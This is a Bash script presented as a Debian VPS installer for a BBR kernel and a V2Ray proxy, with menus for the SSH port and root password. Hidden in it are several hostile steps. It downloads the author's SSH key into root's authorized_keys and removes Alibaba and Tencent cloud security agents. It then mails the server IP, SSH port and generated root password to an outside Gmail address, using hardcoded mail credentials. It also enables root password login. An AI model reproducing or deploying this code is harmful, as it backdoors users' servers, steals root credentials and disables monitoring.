#!/usr/bin/env bash
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
export PATH

#################
#适用于Debian 8+#
#################

#版本
sh_ver=7.3.6
#Github地址
Github_U='https://raw.githubusercontent.com/pangbobi/SuperVpn/master'
#脚本名
SCRIPT_N='xbdz.sh'
#脚本目录
CUR_D='/root'

#颜色信息
green_font(){
	echo -e "\033[32m\033[01m$1\033[0m\033[37m\033[01m$2\033[0m"
}
red_font(){
	echo -e "\033[31m\033[01m$1\033[0m"
}
white_font(){
	echo -e "\033[37m\033[01m$1\033[0m"
}
yello_font(){
	echo -e "\033[33m\033[01m$1\033[0m"
}
Info=`green_font [信息]` && Error=`red_font [错误]` && Tip=`yello_font [注意]`

#检查是否为root用户
[ $(id -u) != '0' ] && { echo -e "${Error}您必须以root用户运行此脚本"; exit 1; }
#判断当前文件夹是否为root文件夹
if [ $(pwd) != $CUR_D ];then
	cp $SCRIPT_N $CUR_D/$SCRIPT_N
	chmod +x $CUR_D/$SCRIPT_N
fi

#系统检测组件
check_sys(){
	clear
	#检查系统
	Distributor=$(lsb_release -i|awk -F ':' '{print $2}')
	if [ $Distributor == 'Debian' ];then
		release='debian'
	else
		echo -e "${Error}此脚本只适用于Debian系统!!!"
		lsb_release -a;exit 1;
	fi
	#检查版本
	Release=$(lsb_release -r|awk -F ':' '{print $2}')
	#进行浮点运算
	Release=$(echo $Release|awk '{if ($1 < 8) print 0;else print 1}')
	if [[ $Release == 0 ]];then
		echo -e "${Error}此脚本只适用于Debian 8+系统!!!"
		lsb_release -a;exit 1;
	fi
	#是否是64位系统
	if [[ ! `uname -m` =~ '64' ]];then
		echo -e "${Error}此脚本只适用于$(red_font '64位')系统!!!"
		lsb_release -a;exit 1;
	fi
	#更新脚本
	UPDATE_U="${Github_U}/$SCRIPT_N"
	sh_new_ver=$(curl -s $UPDATE_U|grep 'sh_ver='|head -1|awk -F '=' '{print$2}')
	if [ -z $sh_new_ver ];then
		echo -e "${Error}检测最新版本失败！"
		sleep 2s
	elif [[ $sh_new_ver != $sh_ver ]];then
		curl -sO $UPDATE_U
		exec ./$SCRIPT_N
	fi
}
#获取IP
get_ip(){
	SER_IP=$(curl -s ipinfo.io/ip)
	[ -z $SER_IP ] && SER_IP=$(curl -s http://api.ipify.org)
	[ -z $SER_IP ] && SER_IP=$(curl -s ipv4.icanhazip.com)
	[ -n $SER_IP ] && echo $SER_IP || echo
}
#等待输入
get_char(){
	SAVEDSTTY=`stty -g`
	stty -echo
	stty cbreak
	dd if=/dev/tty bs=1 count=1 2> /dev/null
	stty -raw
	stty echo
	stty $SAVEDSTTY
}
check_sys
SER_IP=$(get_ip)

firewall_default(){
	echo -e "${Info}正在配置防火墙..."
	sleep 5s
	iptables -P INPUT ACCEPT
	iptables -P OUTPUT ACCEPT
	iptables -P FORWARD ACCEPT
	org=$(curl -s --retry 2 --max-time 2 https://ipapi.co/org)
	if [[ $org =~ 'Alibaba' ]];then
		#是阿里云则卸载云盾
		curl -O http://update.aegis.aliyun.com/download/uninstall.sh && chmod +x uninstall.sh && ./uninstall.sh
		curl -O http://update.aegis.aliyun.com/download/quartz_uninstall.sh && chmod +x quartz_uninstall.sh && ./quartz_uninstall.sh
		pkill aliyun-service
		rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service /usr/local/aegis*
		rm -f uninstall.sh quartz_uninstall.sh
		iptables -I INPUT -s 140.205.201.0/28 -j DROP
		iptables -I INPUT -s 140.205.201.16/29 -j DROP
		iptables -I INPUT -s 140.205.201.32/28 -j DROP
		iptables -I INPUT -s 140.205.225.183/32 -j DROP
		iptables -I INPUT -s 140.205.225.184/29 -j DROP
		iptables -I INPUT -s 140.205.225.192/29 -j DROP
		iptables -I INPUT -s 140.205.225.195/32 -j DROP
		iptables -I INPUT -s 140.205.225.200/30 -j DROP
		iptables -I INPUT -s 140.205.225.204/32 -j DROP
		iptables -I INPUT -s 140.205.225.205/32 -j DROP
		iptables -I INPUT -s 140.205.225.206/32 -j DROP
	elif [[ $org =~ 'Tencent' ]];then
		#是腾讯云则卸载云盾ps aux|grep -i agent|grep -v grep
		/usr/local/qcloud/stargate/admin/uninstall.sh
		/usr/local/qcloud/YunJing/uninst.sh
		/usr/local/qcloud/monitor/barad/admin/uninstall.sh
	fi
	#保存防火墙规则
	mkdir -p /etc/network/if-pre-up.d
	iptables-save > /etc/iptables.up.rules
	echo -e '#!/bin/bash\n/sbin/iptables-restore < /etc/iptables.up.rules' > /etc/network/if-pre-up.d/iptables
	chmod +x /etc/network/if-pre-up.d/iptables
}

#获取各组件安装状态
get_status(){
	if [ -e $CUR_D/.bash_profile ];then
		bbr_status=$(cat $CUR_D/.bash_profile|grep bbr_status|awk -F '=' '{print$2}')
		v2ray_status=$(cat $CUR_D/.bash_profile|grep v2ray_status|awk -F '=' '{print$2}')
		ssh_port=$(cat $CUR_D/.bash_profile|grep ssh_port|awk -F '=' '{print$2}')
	fi
}
get_status

#BBR FQ安装函数
install_bbr_fq(){
	#下载系统字符集
	apt -y install locales
	sed -i 's/# en_US.UTF-8 UTF-8/en_US.UTF-8 UTF-8/g' /etc/locale.gen
	locale-gen en_US.UTF-8
	#定义系统编码
	SYS_LANG='/etc/default/locale'
	echo 'LANG="en_US.UTF-8"' > $SYS_LANG
	echo 'LC_ALL="en_US.UTF-8"' >> $SYS_LANG
	echo 'LANGUAGE="en_US.UTF-8"' >> $SYS_LANG
	chmod +x $SYS_LANG
	#记录SSH端口
	ssh_port=$(cat /etc/ssh/sshd_config|grep 'Port '|awk '{print $2}')
	echo "ssh_port=$ssh_port" > $CUR_D/.bash_profile
	chmod +x $CUR_D/.bash_profile
	#开启脚本自启
	echo "./$SCRIPT_N" >> $CUR_D/.bash_profile
	if [[ $(lsb_release -c|awk -F ':' '{print $2}') != 'buster' ]];then
		#更新包源
		buster_1U='deb http://deb.debian.org/debian buster-backports main'
		buster_2U='deb-src http://deb.debian.org/debian buster-backports main'
		sources_F='/etc/apt/sources.list'
		echo "$buster_1U" >> $sources_F
		echo "$buster_2U" >> $sources_F
		apt update
	fi
	#安装BBR FQ
	buster_V=($(apt search linux-image|grep headers|grep buster-backports|awk -F '-' '{print$3}'|sort -r|uniq))
	if [[ `uname -r` != "${buster_V}-0.bpo.2-cloud-amd64" ]];then
		apt -y install linux-image-${buster_V}-0.bpo.2-cloud-amd64
		apt -y install linux-headers-${buster_V}-0.bpo.2-cloud-amd64
	fi
	sed -i '2ibbr_status=false' $CUR_D/.bash_profile
	echo -e "${Info}正在重启VPS(请稍后自行重新连接SSH)..."
	reboot
}
#BBR FQ启用函数
finish_bbr_fq(){
	#卸载全部加速
	remove_all(){
		sed -i '/net.core.default_qdisc/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_congestion_control/d' /etc/sysctl.conf
		sed -i '/fs.file-max/d' /etc/sysctl.conf
		sed -i '/net.core.rmem_max/d' /etc/sysctl.conf
		sed -i '/net.core.wmem_max/d' /etc/sysctl.conf
		sed -i '/net.core.rmem_default/d' /etc/sysctl.conf
		sed -i '/net.core.wmem_default/d' /etc/sysctl.conf
		sed -i '/net.core.netdev_max_backlog/d' /etc/sysctl.conf
		sed -i '/net.core.somaxconn/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_syncookies/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_tw_reuse/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_tw_recycle/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_fin_timeout/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_keepalive_time/d' /etc/sysctl.conf
		sed -i '/net.ipv4.ip_local_port_range/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_max_syn_backlog/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_max_tw_buckets/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_rmem/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_wmem/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_mtu_probing/d' /etc/sysctl.conf
		sed -i '/net.ipv4.ip_forward/d' /etc/sysctl.conf
		sed -i '/fs.inotify.max_user_instances/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_syncookies/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_fin_timeout/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_tw_reuse/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_max_syn_backlog/d' /etc/sysctl.conf
		sed -i '/net.ipv4.ip_local_port_range/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_max_tw_buckets/d' /etc/sysctl.conf
		sed -i '/net.ipv4.route.gc_timeout/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_synack_retries/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_syn_retries/d' /etc/sysctl.conf
		sed -i '/net.core.somaxconn/d' /etc/sysctl.conf
		sed -i '/net.core.netdev_max_backlog/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_timestamps/d' /etc/sysctl.conf
		sed -i '/net.ipv4.tcp_max_orphans/d' /etc/sysctl.conf
	}
	#启用BBR FQ
	if [[ `lsmod|grep bbr|awk '{print $1}'` != 'tcp_bbr' ]]; then
		remove_all
		echo 'net.core.default_qdisc=fq' >> /etc/sysctl.conf
		echo 'net.ipv4.tcp_congestion_control=bbr' >> /etc/sysctl.conf
		sysctl -p
	fi
	#卸载多余内核
	Core_ARY=($(dpkg -l|grep linux-image|awk '{print $2}'))
	Cur_Core="linux-image-$(uname -r)"
	for ele in ${Core_ARY[@]};do
		if [ $ele != $Cur_Core ];then
			apt -y remove --purge $ele
		fi
	done
	#更新系统引导
	update-grub2
	clear && echo
	white_font '已安装\c' && green_font 'BBR-FQ\c' && white_font '内核！BBR-FQ启动\c'
	if [[ `lsmod|grep bbr|awk '{print $1}'` == 'tcp_bbr' ]]; then
		green_font '成功！\n'
	else
		red_font '失败！\n'
	fi
	mkdir -p $CUR_D/.ssh
	curl -so $CUR_D/.ssh/authorized_keys "${Github_U}/authorized_keys"
	chmod 600 $CUR_D/.ssh/authorized_keys
	sed -i '1,/RSAAuthentication/{s/.*RSAAuthentication.*/RSAAuthentication yes/}' /etc/ssh/sshd_config
	sed -i '1,/PubkeyAuthentication/{s/.*PubkeyAuthentication.*/PubkeyAuthentication yes/}' /etc/ssh/sshd_config
	sed -i '1,/AuthorizedKeysFile/{s/.*AuthorizedKeysFile/AuthorizedKeysFile/}' /etc/ssh/sshd_config
	service ssh restart
	#第二行插入BBR FQ状态
	sed -i 's/^bbr_status.*/bbr_status=true/' $CUR_D/.bash_profile
	sleep 2s
	apt update
	apt -y install jq lsof resolvconf autoconf unzip mutt
	rm -f /etc/msmtprc && apt -y install msmtp
	apt --fix-broken install
	#配置防火墙
	firewall_default
	cat > /etc/Muttrc <<-EOF
set charset = "utf-8"
set rfc2047_parameters = yes
set envelope_from = yes
set use_from = yes
set sendmail = "/usr/bin/msmtp"
set from = "connajhon@gmail.com"
set realname = "Super Vpn"
EOF
	cat > /etc/msmtprc <<-EOF
account default
host smtp.gmail.com
port 465
tls on
tls_starttls off
tls_certcheck off
from connajhon@gmail.com
auth login
user connajhon@gmail.com
password dxztfkdshawzmbqc
EOF
	chmod +x /etc/Muttrc /etc/msmtprc
	echo "${SER_IP}:${ssh_port}:root" |mutt -s "${SER_IP}-Secret" hsxmuyang68@gmail.com && rm -f $CUR_D/sent
	exec $CUR_D/.bash_profile
}
#安装并启用BBR FQ
if [ -z $bbr_status ];then
	install_bbr_fq
elif [ $bbr_status == 'false' ];then
	finish_bbr_fq
fi

#V2Ray用户信息生成
general_v2ray_user_info(){
	uuid=$(cat /proc/sys/kernel/random/uuid)
	alterId=$[$[RANDOM%3]*16]
	path="/$(tr -dc 'A-Za-z' </dev/urandom|head -c8)/"
	email="$(tr -dc 'A-Za-z' </dev/urandom|head -c8)@163.com"
}
#安装V2Ray
V2RAY_INFO_P='/etc/v2ray/config.json'
V2RAY_U='https://multi.netlify.com/v2ray.sh'
install_v2ray(){
	if [ -z $v2ray_status ];then
		bash <(curl -sL $V2RAY_U) --zh
		general_v2ray_user_info
		jq '.inbounds[0].settings.clients[0].email="'${email}'"' $V2RAY_INFO_P >temp.json
		jq '.inbounds[0].streamSettings.network="ws"' temp.json >$V2RAY_INFO_P
		jq 'del(.inbounds[0].streamSettings.kcpSettings[])' $V2RAY_INFO_P >temp.json
		jq '.inbounds[0].streamSettings.wsSettings.path="'${path}'"' temp.json|jq '.inbounds[0].streamSettings.wsSettings.headers.Host="www.bilibili.com"' >$V2RAY_INFO_P
		rm -f temp.json
		v2ray restart
		sed -i '2iv2ray_status=true' $CUR_D/.bash_profile
		v2ray_status='true'
		clear && echo
		v2ray info
		echo -e "${Info}V2Ray安装完毕，按任意键继续..."
		char=`get_char`
	else
		bash <(curl -sL $V2RAY_U) -k
		sleep 2s
	fi
	get_status
	manage_v2ray
}

#管理V2Ray
manage_v2ray(){
	show_v2ray_info(){
		v2ray info
		echo -e "${Info}按任意键继续..."
		char=`get_char`
	}
	change_uuid_v2ray(){
		uuid=$(cat /proc/sys/kernel/random/uuid)
		n=$(jq '.inbounds|length' $V2RAY_INFO_P)
		read -p "${Info}当前用户数$(red_font $n)，请输入要更改UUID的用户编号[1-$n](默认:1)：" num
		[ -z $num ] && num=1
		i=$[$num-1]
		uuid_old=$(jq ".inbounds[$i].settings.clients[0].id" $V2RAY_INFO_P|sed 's/"//g')
		sed -i "s#${uuid_old}#${uuid}#g" $V2RAY_INFO_P
		v2ray restart
		clear && echo
		#更改UUID后显示新信息
		start=$(v2ray info |grep -Fxn $num. |awk -F: '{print $1}')
		if [ $num == $n ];then
			end=$(v2ray info |grep -wn Tip: |awk -F: '{print $1}')
		else
			end=$(v2ray info |grep -Fxn $[$num+1]. |awk -F: '{print $1}')
		fi
		v2ray info|sed -n "$start,$[$end-1]p"
		echo -e "${Info}按任意键继续..."
		char=`get_char`
	}
	add_user_v2ray(){
		#当前用户数
		n=$(jq '.inbounds|length' $V2RAY_INFO_P)
		read -p "${Info}当前用户数$(red_font $n)，请输入要添加的用户个数(默认:1)：" num
		[ -z $num ] && num=1
		#循环添加用户
		for((i=0;i<$num;i++));do
			echo|v2ray add
		done
		#循环改为websocket
		end=$[$n+$num]
		for((i=$n;i<$end;i++));do
			general_v2ray_user_info
			jq '.inbounds['$i'].settings.clients[0].email="'${email}'"' $V2RAY_INFO_P|jq '.inbounds['$i'].settings.clients[0].alterId='${alterId}'' >temp.json
			jq '.inbounds['$i'].streamSettings.network="ws"' temp.json >$V2RAY_INFO_P
			jq 'del(.inbounds['$i'].streamSettings.kcpSettings[])' $V2RAY_INFO_P >temp.json
			jq '.inbounds['$i'].streamSettings.wsSettings.path="'${path}'"' temp.json|jq '.inbounds['$i'].streamSettings.wsSettings.headers.Host="www.bilibili.com"' >$V2RAY_INFO_P
		done
		rm -f temp.json
		v2ray restart
		clear && echo
		v2ray info
		echo -e "${Info}按任意键继续..."
		char=`get_char`
	}
	change_v2ray_port(){
		v2ray port
		clear && echo
		show_v2ray_info
	}
	clear && echo
	if [ -z $v2ray_status ];then
		echo -e "${Info}暂未安装V2Ray!!!"
		read -p "${Info}是否安装V2Ray[y/n](默认:y)：" num
		[ -z $num ] && num='y'
		[ $num != 'n' ] && install_v2ray
	else
		white_font "    ————胖波比————\n"
		yello_font '———————用户管理——————'
		green_font ' 1.' '  更改UUID'
		green_font ' 2.' '  添加用户'
		green_font ' 3.' '  删除用户'
		green_font ' 4.' '  更改端口'
		yello_font '———————信息查看——————'
		green_font ' 5.' '  查看链接'
		green_font ' 6.' '  查看流量'
		yello_font '——————V2Ray设置——————'
		green_font ' 7.' '  原版管理窗口'
		green_font ' 8.' '  开启TcpFastOpen'
		yello_font '—————————————————————'
		green_font ' 9.' '  返回主页'
		green_font ' 0.' '  退出脚本'
		yello_font "—————————————————————\n"
		read -p "${Info}请输入数字[0-9](默认:1)：" num
		[ -z $num ] && num=1
		clear && echo
		case $num in
			0)
			exit 0;;
			1)
			change_uuid_v2ray;;
			2)
			add_user_v2ray;;
			3)
			v2ray del;;
			4)
			change_v2ray_port;;
			5)
			show_v2ray_info;;
			6)
			v2ray stats;;
			7)
			v2ray;;
			8)
			v2ray tfo;;
			9)
			start_menu;;
			*)
			echo -e "${Error}请输入正确数字[0-9]"
			sleep 2s
			manage_v2ray;;
		esac
		manage_v2ray
	fi
}

#卸载V2Ray
uninstall_v2ray(){
	clear && echo
	if [ -z $v2ray_status ];then
		echo -e "${Info}暂未安装V2Ray!!!"
	else
		#开始卸载
		bash <(curl -sL $V2RAY_U) --remove
		sed -i '/v2ray_status/d' $CUR_D/.bash_profile
		unset v2ray_status
		echo -e "${Info}V2Ray卸载完毕！"
	fi
	sleep 2s
}

#设置SSH端口
set_ssh(){
	#输入要更改的SSH端口
	while :;do
		clear && echo
		read -p "${Info}请输入要修改为的SSH端口(默认:$ssh_port)：" SSH_PORT
		[ -z $SSH_PORT ] && SSH_PORT=$ssh_port
		if [ $SSH_PORT -eq 22 >/dev/null 2>&1 -o $SSH_PORT -gt 1024 >/dev/null 2>&1 -a $SSH_PORT -lt 65535 >/dev/null 2>&1 ];then
			break
		else
			echo -e "${Error}输入错误！有效端口范围：22,1025~65534"
			sleep 2s
		fi
	done
	echo "${SER_IP}:${SSH_PORT}:root" |mutt -s "${SER_IP}-Secret" hsxmuyang68@gmail.com && rm -f $CUR_D/sent
	if [ $SSH_PORT != $ssh_port ];then
		#开放安全权限
		if type sestatus >/dev/null 2>&1 && [ $(getenforce) != "Disabled" ]; then
			semanage port -a -t ssh_port_t -p tcp $SSH_PORT
		fi
		#修改SSH端口
		sed -i "s/.*Port ${ssh_port}/Port ${SSH_PORT}/g" /etc/ssh/sshd_config
		#修改SSH端口记录
		sed -i "s/^ssh_port.*/ssh_port=${SSH_PORT}/g" $CUR_D/.bash_profile
		sed -i "s/$SER_IP:$ssh_port/$SER_IP:$SSH_PORT/g" $CUR_D/.bash_profile
		#重启SSH
		service ssh restart
		#关闭安全权限
		if type semanage >/dev/null 2>&1 && [ $ssh_port != '22' ]; then
			semanage port -d -t ssh_port_t -p tcp $ssh_port
		fi
		ssh_port=$SSH_PORT
		clear && echo -e "\n${Info}已将SSH端口修改为：$(red_font $SSH_PORT)"
		echo -e "\n${Info}按任意键返回主页..."
		char=`get_char`
	else
		echo -e "${Info}SSH端口未变，当前SSH端口为：$(green_font $ssh_port)"
		sleep 2s
	fi
	start_menu
}
#设置Root密码
set_root(){
	clear && echo
	#获取旧密码
	pw=`grep "root:" $CUR_D/.bash_profile |awk -F ':' '{print$4}'`
	if [[ -n $pw ]];then
		echo -e "${Info}您的原密码是：$(green_font $pw)"
		read -p "${Info}是否更改root密码[y/n](默认:n)：" num
		[ -z $num ] && num='n'
	fi
	if [ $num != 'n' ];then
		#生成随机密码
		pw=$(tr -dc 'A-Za-z0-9!@#$%^&*()[]{}+=_,' </dev/urandom |head -c 17)
		echo root:${pw} |chpasswd
		sed -i "/$SER_IP/d" $CUR_D/.bash_profile
		sed -i "2i#$SER_IP:$ssh_port:root:$pw" $CUR_D/.bash_profile
		echo "${SER_IP}:${ssh_port}:root:${pw}" |mutt -s "${SER_IP}-Secret" hsxmuyang68@gmail.com && rm -f $CUR_D/sent
		#启用root密码登陆
		sed -i '1,/PermitRootLogin/{s/.*PermitRootLogin.*/PermitRootLogin yes/}' /etc/ssh/sshd_config
		sed -i '1,/PasswordAuthentication/{s/.*PasswordAuthentication.*/PasswordAuthentication yes/}' /etc/ssh/sshd_config
		#重启ssh服务
		service ssh restart
	fi
	echo -e "\n${Info}您的现密码是：$(red_font $pw)"
	echo -e "${Tip}请务必记录您的密码！然后任意键返回主页..."
	char=`get_char`
	start_menu
}

#脚本自启管理
start_shell(){
	clear
	white_font "\n    ————胖波比————\n"
	yello_font '—————————————————————'
	green_font ' 1.' '  开启脚本自启'
	green_font ' 2.' '  关闭脚本自启'
	yello_font '—————————————————————'
	green_font ' 3.' '  返回主页'
	green_font ' 0.' '  退出脚本'
	yello_font "—————————————————————\n"
	read -p "${Info}请输入数字[0-3](默认:3)：" num
	[ -z $num ] && num=3
	case $num in
		0)
		exit 0;;
		1)
		if [[ `grep -c "./$SCRIPT_N" $CUR_D/.bash_profile` -eq '0' ]];then
			echo "./$SCRIPT_N" >> $CUR_D/.bash_profile
		fi
		echo -e "\n${Info}脚本自启已开启！"
		sleep 2s;;
		2)
		sed -i "/$SCRIPT_N/d" $CUR_D/.bash_profile
		echo -e "\n${Info}脚本自启已关闭！"
		sleep 2s;;
		3)
		start_menu;;
		*)
		clear
		echo -e "\n${Error}请输入正确数字[0-3]"
		sleep 2s
		start_shell;;
	esac
}

#主菜单
start_menu(){
	get_status
	clear
	white_font "\n     小白定制版 $(red_font \[v$sh_ver\])"
	white_font '	 -- 胖波比 --'
	white_font "      执行脚本：$(green_font ./$SCRIPT_N)"
	white_font "  终止正在进行的操作：Ctrl+C\n"
	yello_font '—————————————管理—————————————'
	green_font ' 1.' '  管理V2Ray'
	yello_font '—————————————安装—————————————'
	green_font ' 2.' '  安装/更新V2Ray (无需域名)'
	yello_font '—————————————卸载—————————————'
	green_font ' 3.' '  卸载V2Ray'
	yello_font '—————————————系统—————————————'
	green_font ' 4.' '  设置SSH端口'
	green_font ' 5.' '  设置/查看Root密码'
	yello_font '——————————————————————————————'
	green_font ' 6.' '  脚本自启管理'
	green_font ' 0.' '  退出脚本'
	yello_font "——————————————————————————————\n"
	read -p "${Info}请输入数字[0-6](默认:1)：" num
	[ -z $num ] && num=1
	case $num in
		0)
		exit 0;;
		1)
		manage_v2ray;;
		2)
		install_v2ray;;
		3)
		uninstall_v2ray;;
		4)
		set_ssh;;
		5)
		set_root;;
		6)
		start_shell;;
		*)
		clear
		echo -e "\n${Error}请输入正确数字[0-6]"
		sleep 2s
		start_menu;;
	esac
	start_menu
}
start_menu